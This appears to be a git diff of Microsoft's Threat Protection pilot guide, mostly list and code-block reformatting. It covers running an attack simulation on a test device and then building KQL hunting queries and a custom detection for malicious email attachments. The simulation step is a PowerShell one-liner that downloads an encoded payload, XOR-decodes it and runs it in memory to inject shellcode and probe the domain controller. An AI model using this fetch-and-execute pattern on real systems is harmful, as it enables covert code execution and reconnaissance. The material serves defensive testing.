@@ -87,22 +87,24 @@ During the simulation, the attack injects shellcode into a seemingly innocent pr
 
 Since you have already configured your pilot environment during the preparation phase, ensure that you have two devices for this scenario: a test device and a domain controller.
 
-1.	Verify your tenant has [enabled Microsoft Threat Microsoft Threat Protection](https://docs.microsoft.com/microsoft-365/security/mtp/mtp-enable#starting-the-service)￼￼.
+1.	Verify your tenant has [enabled Microsoft Threat Microsoft Threat Protection](https://docs.microsoft.com/microsoft-365/security/mtp/mtp-enable#starting-the-service).
+
 2.	Verify your test domain controller configuration:
+
     - Device runs with Windows Server 2008 R2 or a later version.
     - The test domain controller to [Azure Advanced Threat Protection](https://docs.microsoft.com/azure/security-center/security-center-wdatp) and enable [remote management](https://docs.microsoft.com/windows-server/administration/server-manager/configure-remote-management-in-server-manager).    
     - Verify that [Azure ATP and Microsoft Cloud App Security integration](https://docs.microsoft.com/cloud-app-security/aatp-integration) have been enabled.
     - A test user is created on your domain – no admin permissions needed.
 
 3.	Verify test device configuration:
-    <br>
-    a.	Device runs with Windows 10 version 1903 or a later version.
-    <br>
-    b.	Test device is joined to the test domain.
-    <br>
-    c.	[Turn on Windows Defender Antivirus](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features). If you are having trouble enabling Windows Defender Antivirus, see this [troubleshooting topic](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy).
-    <br>
-    d.	Verify that the test device is [onboarded to Microsoft Defender Advanced Threat Protection (MDATP)](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).
+ 
+    1.	Device runs with Windows 10 version 1903 or a later version.
+    
+    1.	Test device is joined to the test domain.
+    
+    1.	[Turn on Windows Defender Antivirus](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features). If you are having trouble enabling Windows Defender Antivirus, see this [troubleshooting topic](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy).
+    
+    1.	Verify that the test device is [onboarded to Microsoft Defender Advanced Threat Protection (MDATP)](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).
 
 If you use an existing tenant and implement device groups, create a dedicated device group for the test device and push it to top level in configuration UX.
 
@@ -116,15 +118,17 @@ To run the attack scenario simulation:
 2.	Open a Windows PowerShell window on the test device.
 
 3.	Copy the following simulation script:
-```
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor
-= [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI "https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt"
--UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
-$decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
-$i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
-```
->[!NOTE]
->If you open this document on a web browser, you might encounter problems copying the full text without losing certain characters or introducing extra line breaks. Download this document and open it on Adobe Reader.
+
+    ```powershell
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor
+    = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI "https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt"
+    -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
+    $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
+    $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
+    ```
+    
+    > [!NOTE]
+    > If you open this document on a web browser, you might encounter problems copying the full text without losing certain characters or introducing extra line breaks. Download this document and open it on Adobe Reader.
 
 4. At the prompt, paste and run the copied script.
 
@@ -137,7 +141,7 @@ The simulated attack code will attempt to communicate to an external IP address 
 
 You will see a message displayed on the PowerShell console when this script completes.
 
-```
+```console
 ran NetSessionEnum against [DC Name] with return code result 0      
 ```
 
@@ -331,96 +335,98 @@ There is a single internal mailbox and device required for this scenario. You wi
 
 **Go hunting**
 1.	Open the security.microsoft.com portal.
+
 2.	Navigate to **Hunting > Advanced hunting**.
 
     ![Screenshot of advanced hunting in the M365 Security Center portal navigation bar](../../media/mtp/fig17.png) 
 
 3.	Build a query that starts by gathering email events.
-    a.	From the query pane, select New.
-    b.	Double-click on the EmailEvents table from the schema.
 
-```
-EmailEvents 
-```                                        
+    1.	From the query pane, select New.
+    
+    1.	Double-click on the EmailEvents table from the schema.
 
-   c.	Change the time frame to the last 24 hours. Assuming the email you sent when you ran the simulation above was in the past 24 hours, otherwise change the time frame.
-   ![Screenshot of where you can change the time frame. Open the drop-down menu to choose from range of time frame options](../../media/mtp/fig18.png) 
+        ```
+        EmailEvents 
+        ```                                        
 
+    1.	Change the time frame to the last 24 hours. Assuming the email you sent when you ran the simulation above was in the past 24 hours, otherwise change the time frame.
+    
+        ![Screenshot of where you can change the time frame. Open the drop-down menu to choose from range of time frame options](../../media/mtp/fig18.png) 
 
-   d.	Run the query.  You may have many results depending on the environment for the pilot.  
+    1.	Run the query.  You may have many results depending on the environment for the pilot.  
 
->[!NOTE]
->See the next step for filtering options to limit data return.
+        > [!NOTE]
+        > See the next step for filtering options to limit data return.
 
-   ![Screenshot of the advanced hunting query results](../../media/mtp/fig19.png) 
+        ![Screenshot of the advanced hunting query results](../../media/mtp/fig19.png) 
 
->[!NOTE]
->Advanced hunting displays query results as tabular data. You can also opt to view the data in other format types such as charts.    
+        > [!NOTE]
+        > Advanced hunting displays query results as tabular data. You can also opt to view the data in other format types such as charts.    
 
-   e.	Look at the results and see if you can identify the email you opened.  It may take up to 2 hours for the message to show up in advanced hunting. If the email environment is large and there are many results, you might want to use the **Show Filters option** to find the message. 
+    1.	Look at the results and see if you can identify the email you opened.  It may take up to 2 hours for the message to show up in advanced hunting. If the email environment is large and there are many results, you might want to use the **Show Filters option** to find the message. 
 
    In the sample, the email was sent from a Yahoo account. Click the **+** icon beside **yahoo.com** under the SenderFromDomain section and then click **Apply** to add the selected domain to the query.  You should use the domain or email account that was used to send the test message in step 1 of Run the Simulation to filter your results.  Run the query again to get a smaller result set to verify that you see the message from the simulation.
    
    ![Screenshot of the filters. Use filters to narrow down the search, and find what you’re looking for faster.](../../media/mtp/fig20.png) 
 
+   ```console
+   EmailEvents 
+   | where SenderMailFromDomain == "yahoo.com"
+   ```
 
-```
-EmailEvents 
-| where SenderMailFromDomain == "yahoo.com"
-```
-
-   f.	Click the resulting rows from the query so you can inspect the record.
-   ![Screenshot of the inspect record side panel which opens up when an advanced hunting result is selected](../../media/mtp/fig21.png) 
-
+   1.	Click the resulting rows from the query so you can inspect the record.
+    
+      ![Screenshot of the inspect record side panel which opens up when an advanced hunting result is selected](../../media/mtp/fig21.png) 
 
 4.	Now that you have verified that you can see the email, add a filter for the attachments. Focus on all emails with attachments in the environment. For this scenario, focus on inbound emails, not those that are being sent out from your environment. Remove any filters you have added to locate your message and add “| where **AttachmentCount > 0** and **EmailDirection** == **“Inbound””**
 
-The following query will show you the result with a shorter list than your initial query for all email events:
+    The following query will show you the result with a shorter list than your initial query for all email events:
 
-```
-EmailEvents 
-| where AttachmentCount > 0 and EmailDirection == "Inbound"
+    ```console
+    EmailEvents 
+    | where AttachmentCount > 0 and EmailDirection == "Inbound"
 
-```
+    ```
 
 5.	Next, include the information about the attachment (such as: file name, hashes) to your result set. To do so, join the **EmailAttachmentInfo** table. The common fields to use for joining, in this case are **NetworkMessageId** and **RecipientObjectId**.
 
-The following query also includes an additional line “| **project-rename EmailTimestamp=Timestamp**” that will help identify which timestamp was related to the email versus timestamps related to file actions which you will add in the next step.
+    The following query also includes an additional line “| **project-rename EmailTimestamp=Timestamp**” that will help identify which timestamp was related to the email versus timestamps related to file actions which you will add in the next step.
 
-```
-EmailEvents 
-| where AttachmentCount > 0 and EmailDirection == "Inbound"
-| project-rename EmailTimestamp=Timestamp 
-| join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
-```
+    ```console
+    EmailEvents 
+    | where AttachmentCount > 0 and EmailDirection == "Inbound"
+    | project-rename EmailTimestamp=Timestamp 
+    | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
+    ```
 
 6.	Next, use the **SHA256** value from the **EmailAttachmentInfo** table to find **DeviceFileEvents** (file actions that happened on the endpoint) for that hash.  The common field here will be the SHA256 hash for the attachment.
 
-The resulting table now includes details from the endpoint (Microsoft Defender ATP) such as device name, what action was done (in this case, filtered to only include FileCreated events), and where the file was stored. The account name associated with the process will also be included.
+    The resulting table now includes details from the endpoint (Microsoft Defender ATP) such as device name, what action was done (in this case, filtered to only include FileCreated events), and where the file was stored. The account name associated with the process will also be included.
 
-```
-EmailEvents 
-| where AttachmentCount > 0 and EmailDirection == "Inbound"
-| project-rename EmailTimestamp=Timestamp 
-| join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId 
-| join DeviceFileEvents on SHA256 
-| where ActionType == "FileCreated"
-```
+    ```console
+    EmailEvents 
+    | where AttachmentCount > 0 and EmailDirection == "Inbound"
+    | project-rename EmailTimestamp=Timestamp 
+    | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId 
+    | join DeviceFileEvents on SHA256 
+    | where ActionType == "FileCreated"
+    ```
 
-You have now created a query that will identify all inbound emails where the user opened or saved the attachment. You can also refine this query to filter for specific sender domains, file sizes, file types, and so on.
+    You have now created a query that will identify all inbound emails where the user opened or saved the attachment. You can also refine this query to filter for specific sender domains, file sizes, file types, and so on.
 
 7.	Functions are a special sort of join which let you pull more TI data about a file like its prevalence, signer and issuer info, etc.  To get more details on the file, use the **FileProfile()** function enrichment:
 
-```
-EmailEvents 
-| where AttachmentCount > 0 and EmailDirection == "Inbound"
-| project-rename EmailTimestamp=Timestamp 
-| join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
-| join DeviceFileEvents on SHA256 
-| where ActionType == "FileCreated"
-| distinct SHA1
-| invoke FileProfile()
-```
+    ```console
+    EmailEvents 
+    | where AttachmentCount > 0 and EmailDirection == "Inbound"
+    | project-rename EmailTimestamp=Timestamp 
+    | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
+    | join DeviceFileEvents on SHA256 
+    | where ActionType == "FileCreated"
+    | distinct SHA1
+    | invoke FileProfile()
+    ```
 
 
 **Create a detection**
@@ -441,7 +447,7 @@ Custom detections will run the query according to the frequency you set, and the
 
     ![Screenshot of the create detection rule page where you can define the alert details](../../media/mtp/fig23.png)
 
-Ensure that you fill out the fields with clarity to help give the next user an informed decision about this detection rule alert 
+    Ensure that you fill out the fields with clarity to help give the next user an informed decision about this detection rule alert 
 
 3.	Select what entities are impacted in this alert. In this case, select **Device** and **Mailbox**.
 
@@ -456,7 +462,7 @@ Ensure that you fill out the fields with clarity to help give the next user an i
 
     ![Screenshot of the create detection rule page where you can set the scope for the alert rule manages your expectations for the results that you’ll see](../../media/mtp/fig26.png) 
 
-For this pilot, you might want to limit this rule to a subset of testing devices in your production environment.
+    For this pilot, you might want to limit this rule to a subset of testing devices in your production environment.
 
 6.	Select **Create**. Then, select **Custom detection rules** from the navigation panel.
  
@@ -464,9 +470,9 @@ For this pilot, you might want to limit this rule to a subset of testing devices
 
     ![Screenshot of the detection rules page which displays the rule and execution details](../../media/mtp/fig27b.png) 
 
-From this page, you can select the detection rule which will open a details page. 
+    From this page, you can select the detection rule which will open a details page. 
 
-![Screenshot of the email attachments page where you can see the status of the rule execution, triggered alerts and actions, edit the detection, and so on](../../media/mtp/fig28.png) 
+    ![Screenshot of the email attachments page where you can see the status of the rule execution, triggered alerts and actions, edit the detection, and so on](../../media/mtp/fig28.png) 
 
 ### Additional advanced hunting walk-through exercises
 
@@ -475,7 +481,7 @@ To learn more about advanced hunting, the following webcasts will walk you throu
 >[!NOTE]
 >Be prepared with your own GitHub account to run the hunting queries in your pilot test lab environment.  
 
-| **Title** | **Description** | **Download MP4** | **Watch on YouTube** | **CSL file to use** |
+|  Title  |  Description  |  Download MP4  |  Watch on YouTube  |  CSL file to use  |
 |:-----|:-----|:-----|:-----|:-----|
 | Episode 1: KQL fundamentals | We’ll cover the basics of advanced hunting capabilities in Microsoft Threat Protection. Learn about available advanced hunting data and basic KQL syntax and operators. | [ MP4](https://aka.ms/MTP15JUL20_MP4) | [YouTube](https://youtu.be/0D9TkGjeJwM) | [Episode 1: CSL file in Git](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%201%20-%20KQL%20Fundamentals.csl) |
 | Episode 2: Joins | We’ll continue learning about data in advanced hunting and how to join tables together. Learn about inner, outer, unique, and semi joins, and the nuances of the default Kusto innerunique join. | [MP4](https://aka.ms/MTP22JUL20_MP4) | [YouTube](https://youtu.be/LMrO6K5TWOU) | [Episode 2: CSL file in Git](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%202%20-%20Joins.csl) |
